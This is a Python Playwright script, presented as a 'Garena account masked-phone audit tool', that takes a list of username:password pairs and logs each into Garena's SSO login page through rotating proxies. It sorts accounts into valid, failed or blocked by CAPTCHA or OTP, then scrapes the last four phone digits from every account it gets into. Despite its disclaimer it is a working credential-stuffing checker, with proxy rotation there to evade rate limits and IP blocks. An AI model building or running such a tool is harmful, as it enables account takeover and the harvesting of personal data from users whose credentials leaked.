import argparse
import asyncio
import json
import re
import time
from dataclasses import asdict, dataclass
from pathlib import Path
from typing import List, Optional, Tuple
from urllib.parse import urlparse

import aiofiles
from playwright.async_api import TimeoutError as PlaywrightTimeoutError
from playwright.async_api import async_playwright

LOGIN_URL = "https://sso.garena.com/universal/login?app_id=10100&redirect_uri=https%3A%2F%2Faccount.garena.com%2F&locale=vi-VN"
ACCOUNT_URL = "https://account.garena.com/"

SELECTORS = {
    "username": "input[name='username'], input[type='text']",
    "password": "input[name='password'], input[type='password']",
    "login_button": "button[type='submit'], button:has-text('Đăng nhập')",
    "captcha": "iframe[src*='captcha'], text=CAPTCHA, text=captcha",
    "otp": "text=OTP, text=mã xác minh, text=xác minh",
    "phone_section": "text=Số điện thoại, text=Phone",
    "masked_phone": "text=/\\*+\\d{2,4}|\\d{2,3}\\*+\\d{2,4}/",
}


@dataclass
class AuditResult:
    username: str
    status: str
    last_4_digits: str = ""
    masked_phone: str = ""
    error: str = ""
    timestamp: str = ""
    proxy_used: str = ""


class ProxyRotator:
    """Manages proxy rotation and health checks for optimal distribution."""
    
    def __init__(self, proxy_list: List[str]):
        self.proxies = proxy_list
        self.current_index = 0
        self.dead_proxies = set()
        self.lock = asyncio.Lock()
    
    async def get_next_proxy(self) -> Optional[str]:
        """Get next healthy proxy in round-robin fashion."""
        if not self.proxies:
            return None
        
        async with self.lock:
            # Filter out dead proxies
            healthy = [p for p in self.proxies if p not in self.dead_proxies]
            
            if not healthy:
                # All proxies are dead, reset and use all again
                self.dead_proxies.clear()
                healthy = self.proxies
            
            if not healthy:
                return None
            
            # Round-robin selection
            proxy = healthy[self.current_index % len(healthy)]
            self.current_index += 1
            return proxy
    
    async def mark_dead(self, proxy: str) -> None:
        """Mark a proxy as dead (timeout/connection refused)."""
        async with self.lock:
            self.dead_proxies.add(proxy)
            print(f"[PROXY] Marked as dead: {proxy}")
    
    async def reset(self) -> None:
        """Reset all proxy states."""
        async with self.lock:
            self.dead_proxies.clear()
            self.current_index = 0


async def read_proxy_list(path: str) -> List[str]:
    """Read proxy list from file (one per line, format: http://host:port)."""
    proxies = []
    try:
        async with aiofiles.open(path, "r", encoding="utf-8", errors="ignore") as f:
            async for line in f:
                line = line.strip()
                if line and not line.startswith("#"):
                    # Validate proxy format
                    if "://" in line:
                        proxies.append(line)
        print(f"[PROXY] Loaded {len(proxies)} proxies from {path}")
    except FileNotFoundError:
        print(f"[WARN] Proxy file not found: {path}. Running without proxies.")
    return proxies


class RateLimiter:
    def __init__(self, delay: float):
        self.delay = delay
        self.lock = asyncio.Lock()
        self.last_run = 0.0

    async def wait(self) -> None:
        async with self.lock:
            elapsed = time.time() - self.last_run
            if elapsed < self.delay:
                await asyncio.sleep(self.delay - elapsed)
            self.last_run = time.time()


async def read_accounts(path: str) -> List[Tuple[str, str]]:
    accounts: List[Tuple[str, str]] = []
    async with aiofiles.open(path, "r", encoding="utf-8", errors="ignore") as f:
        async for line in f:
            line = line.strip()
            if not line or ":" not in line:
                continue
            username, password = line.split(":", 1)
            username = username.strip()
            password = password.strip()
            if username and password:
                accounts.append((username, password))
    return accounts


async def is_visible(page, selector: str, timeout: int = 1500) -> bool:
    try:
        locator = page.locator(selector).first
        await locator.wait_for(timeout=timeout)
        return await locator.is_visible()
    except Exception:
        return False


def extract_last_4(masked_phone: str) -> str:
    digits = re.findall(r"\d", masked_phone or "")
    if len(digits) >= 4:
        return "".join(digits[-4:])
    return ""


def is_still_on_login_page(url: str) -> bool:
    parsed = urlparse(url)
    hostname = (parsed.hostname or "").lower()
    path = (parsed.path or "").lower()
    return hostname == "sso.garena.com" and "/login" in path


async def fetch_masked_phone(page) -> str:
    candidates = [
        SELECTORS["masked_phone"],
        "text=/\\*+\\d{4}/",
        "text=/\\d{3}\\*+\\d{4}/",
    ]
    for selector in candidates:
        try:
            loc = page.locator(selector).first
            await loc.wait_for(timeout=2000)
            text = (await loc.inner_text()).strip()
            if text:
                return " ".join(text.split())
        except Exception:
            continue
    return ""


async def audit_account(
    browser,
    username: str,
    password: str,
    retries: int,
    timeout: int,
    proxy_rotator: Optional[ProxyRotator],
) -> AuditResult:
    result = AuditResult(
        username=username, 
        status="failed", 
        timestamp=time.strftime("%Y-%m-%dT%H:%M:%SZ", time.gmtime())
    )

    for attempt in range(1, retries + 1):
        context_kwargs = {"locale": "vi-VN", "viewport": {"width": 1280, "height": 800}}
        
        # Get proxy for this attempt
        proxy = None
        if proxy_rotator:
            proxy = await proxy_rotator.get_next_proxy()
            if proxy:
                context_kwargs["proxy"] = {"server": proxy}
                result.proxy_used = proxy
        
        context = await browser.new_context(**context_kwargs)
        page = await context.new_page()

        try:
            await page.goto(LOGIN_URL, wait_until="domcontentloaded", timeout=timeout)

            if await is_visible(page, SELECTORS["captcha"]):
                result.status = "manual_required"
                result.error = "CAPTCHA detected. Please complete verification manually."
                await context.close()
                return result

            await page.fill(SELECTORS["username"], username)
            await page.fill(SELECTORS["password"], password)
            await page.click(SELECTORS["login_button"])
            await page.wait_for_load_state("networkidle", timeout=timeout)

            if await is_visible(page, SELECTORS["otp"]):
                result.status = "manual_required"
                result.error = "OTP verification required."
                await context.close()
                return result

            if await is_visible(page, SELECTORS["captcha"]):
                result.status = "manual_required"
                result.error = "CAPTCHA detected after login."
                await context.close()
                return result

            if is_still_on_login_page(page.url):
                result.status = "failed"
                result.error = "Invalid credentials or login blocked."
                await context.close()
                return result

            await page.goto(ACCOUNT_URL, wait_until="networkidle", timeout=timeout)
            masked_phone = await fetch_masked_phone(page)
            result.masked_phone = masked_phone
            result.last_4_digits = extract_last_4(masked_phone)

            if result.last_4_digits:
                result.status = "success"
            else:
                result.status = "failed"
                result.error = "Could not extract masked phone digits from account page."
            
            await context.close()
            return result

        except PlaywrightTimeoutError:
            result.error = f"Timeout on attempt {attempt}."
            # Mark proxy as dead on timeout
            if proxy and proxy_rotator:
                await proxy_rotator.mark_dead(proxy)
        except Exception as e:
            error_msg = str(e).lower()
            # Detect proxy-related errors
            if "proxy" in error_msg or "connection refused" in error_msg or "econnrefused" in error_msg:
                if proxy and proxy_rotator:
                    await proxy_rotator.mark_dead(proxy)
                result.error = f"Proxy error: {type(e).__name__}"
            else:
                result.error = f"{type(e).__name__}: {e}"
        finally:
            await context.close()

        # Exponential backoff between retries
        backoff = min(2 ** attempt, 30)
        await asyncio.sleep(backoff)

    return result


async def save_outputs(results: List[AuditResult], output_prefix: str) -> None:
    json_path = Path(f"{output_prefix}.json")
    txt_path = Path(f"{output_prefix}.txt")

    async with aiofiles.open(json_path, "w", encoding="utf-8") as f:
        await f.write(json.dumps([asdict(r) for r in results], ensure_ascii=False, indent=2))

    async with aiofiles.open(txt_path, "w", encoding="utf-8") as f:
        for r in results:
            await f.write(
                f"{r.username}|{r.status}|{r.last_4_digits}|{r.masked_phone}|{r.proxy_used}|{r.error}\n"
            )

    print(f"[OK] Saved: {json_path}")
    print(f"[OK] Saved: {txt_path}")


async def worker(
    name: str, 
    queue: asyncio.Queue, 
    browser, 
    args, 
    limiter: RateLimiter, 
    results: List[AuditResult], 
    lock: asyncio.Lock,
    proxy_rotator: Optional[ProxyRotator],
) -> None:
    while True:
        item = await queue.get()
        if item is None:
            queue.task_done()
            return

        username, password = item
        await limiter.wait()
        print(f"[{name}] Checking: {username}")

        result = await audit_account(
            browser=browser,
            username=username,
            password=password,
            retries=args.retries,
            timeout=args.timeout,
            proxy_rotator=proxy_rotator,
        )

        async with lock:
            results.append(result)

        proxy_info = f" (Proxy: {result.proxy_used})" if result.proxy_used else ""
        print(f"[{name}] {username}: {result.status} ({result.error or 'ok'}){proxy_info}")
        queue.task_done()


async def main() -> None:
    parser = argparse.ArgumentParser(
        description=(
            "Garena account masked-phone audit tool with proxy rotation. "
            "This tool does not perform brute-force recovery."
        )
    )
    parser.add_argument("-i", "--input", required=True, help="Input file with username:password lines")
    parser.add_argument("-o", "--output", default="garena_audit_result", help="Output file prefix")
    parser.add_argument("--proxy-list", default=None, help="Proxy list file (one proxy per line)")
    parser.add_argument("--concurrency", type=int, default=1, help="Workers (recommended 1-2)")
    parser.add_argument("--delay", type=float, default=15.0, help="Delay between account attempts (seconds)")
    parser.add_argument("--retries", type=int, default=2, help="Retry attempts per account")
    parser.add_argument("--single-proxy", default=None, help="Optional single proxy (overrides proxy-list)")
    parser.add_argument("--headless", action="store_true", help="Run browser in headless mode")
    parser.add_argument("--timeout", type=int, default=45000, help="Request timeout in milliseconds")
    args = parser.parse_args()

    if args.concurrency > 2:
        print("[WARN] Limiting concurrency to 2 to reduce lock/rate-limit risk.")
        args.concurrency = 2

    accounts = await read_accounts(args.input)
    if not accounts:
        print("[ERR] No valid accounts found in input file.")
        return

    # Initialize proxy rotator
    proxy_rotator = None
    if args.single_proxy:
        proxy_rotator = ProxyRotator([args.single_proxy])
        print(f"[PROXY] Using single proxy: {args.single_proxy}")
    elif args.proxy_list:
        proxies = await read_proxy_list(args.proxy_list)
        if proxies:
            proxy_rotator = ProxyRotator(proxies)
        else:
            print("[WARN] No proxies loaded. Running without proxy rotation.")

    queue: asyncio.Queue = asyncio.Queue()
    for item in accounts:
        await queue.put(item)

    results: List[AuditResult] = []
    lock = asyncio.Lock()
    limiter = RateLimiter(args.delay)

    async with async_playwright() as p:
        browser = await p.chromium.launch(headless=args.headless)
        tasks = [
            asyncio.create_task(
                worker(f"W{i + 1}", queue, browser, args, limiter, results, lock, proxy_rotator)
            )
            for i in range(args.concurrency)
        ]

        for _ in tasks:
            await queue.put(None)

        await queue.join()

        for task in tasks:
            await task

        await browser.close()

    await save_outputs(results, args.output)


if __name__ == "__main__":
    asyncio.run(main())
